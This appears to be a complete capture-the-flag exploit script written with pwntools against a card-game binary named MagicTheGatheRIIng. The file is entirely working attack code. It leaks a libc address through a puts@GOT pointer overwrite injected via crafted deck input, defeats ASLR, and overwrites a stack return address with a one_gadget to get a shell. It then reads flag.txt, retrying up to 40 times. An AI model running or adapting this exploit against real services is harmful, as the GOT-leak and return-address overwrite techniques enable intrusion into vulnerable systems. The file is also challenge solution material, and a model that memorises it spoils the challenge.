#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import os

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'warning'
exe = '.build/MagicTheGatheRIIng' if os.path.exists('.build/MagicTheGatheRIIng') else './MagicTheGatheRIIng'
libc = ELF("publish/MagicTheGatheRIIng-libc.so" if os.path.exists("publish/MagicTheGatheRIIng-libc.so") else "./MagicTheGatheRIIng-libc.so")
binary = ELF(exe)

# Env-driven target so `pwnmake check` can point us at the started container
# (HOST/PORT default to a local instance for manual runs).
HOST = os.environ.get('HOST', 'localhost')
PORT = int(os.environ.get('PORT', 22002))

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe] + argv, *a, **kw)
    else:
        return remote(HOST, PORT)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#PUTS_GOT_ADDR = 0x406020
PUTS_GOT_ADDR = binary.got["puts"]
log.info(f"{PUTS_GOT_ADDR=:#x}")
infoleak_decklist = "\n".join([
    # Overwrite string pointer in computer deck with power/toughness
    # Use to basically leak via puts(puts)
    f"21 m JUNK 14 {PUTS_GOT_ADDR} 0",
    "\n"
])


PROMPT = "> "
CARDS_PROMPT = "Enter cards:\n"

# Offset from puts to magic gadget
#MAGIC_GADGET_OFFSET = -0x30499
MAGIC_GADGET_OFFSET = 0xe3b01  # updated for libc 2.31-0ubuntu9.16 (one_gadget)


def attempt():
    '''Run the full exploit once; return the flag string if we got it, else None.

    The puts@GOT infoleak and the one_gadget both have to line up, so retry the
    whole chain on failure (fresh libc ASLR each connection).'''
    io = start()
    try:
        # Overwrite a string pointer in the CPU deck with address of puts@GOT
        io.sendlineafter(PROMPT, "2")
        io.sendlineafter(CARDS_PROMPT, infoleak_decklist)

        # Play
        io.sendlineafter(PROMPT, "4")

        # Discard CPU first turn
        io.recvuntil("Drew ")
        # Discard Player first turn
        io.recvuntil("Drew ")
        # Wait for CPU second turn, which contains leak
        io.recvuntil("Drew ")
        words = io.recvline(keepends=False)
        log.info(f'{words=}')
        # Second printed card contains leak
        # assert len(words) == 1, "Unexpected space in infoleak, try again"
        if len(words) < 6:
            return None  # Unexpected infoleak length, try again
        puts_addr = int.from_bytes(words[:6], "little")
        log.info(f"{puts_addr=:#x}")
        # Sanity-check the leak is a real puts pointer (page-aligned low bits)
        if (puts_addr & 0xfff) != (libc.symbols['puts'] & 0xfff):
            return None
        libc_base = puts_addr - libc.symbols['puts']
        log.info(f"{libc_base=:#x}")

        magic_gadget_addr = libc_base + MAGIC_GADGET_OFFSET
        exploit_decklist = "\n".join([
            # Overwrite retaddr on stack with power/toughness
            # Has to have mana cost of 0 and be mana (not creature) so RBP will be null for the one_gadget
            f"45 m EXPLOIT 0 {magic_gadget_addr & 0xFFFFFFFF} {magic_gadget_addr >> 32}",
            #f"45 m EXPLOIT 13 5 5",
            # End reading
            "\n"
        ])

        # Wait for the game to finish, then send exploit
        io.sendlineafter(PROMPT, "2")
        io.sendlineafter(CARDS_PROMPT, exploit_decklist)

        # Exit, triggering the exploit and one_gadget
        io.sendlineafter(PROMPT, "5")

        # Print the flag so `pwnmake check` can verify it (instead of a shell)
        io.sendline("cat flag.txt")
        data = io.recvrepeat(1.5)
        text = data.decode(errors="replace")
        m = re.search(r"sun\{[^}]*\}", text)
        if m:
            return m.group(0)
        return None
    finally:
        try:
            io.close()
        except Exception:
            pass


# Retry the probabilistic one_gadget until it lands (bounded by CHECK_TIMEOUT).
for i in range(40):
    try:
        flag = attempt()
    except (EOFError, BrokenPipeError):
        flag = None
    if flag:
        print(flag)
        break
    log.info("attempt %d failed, retrying", i)
else:
    print("exploit failed")
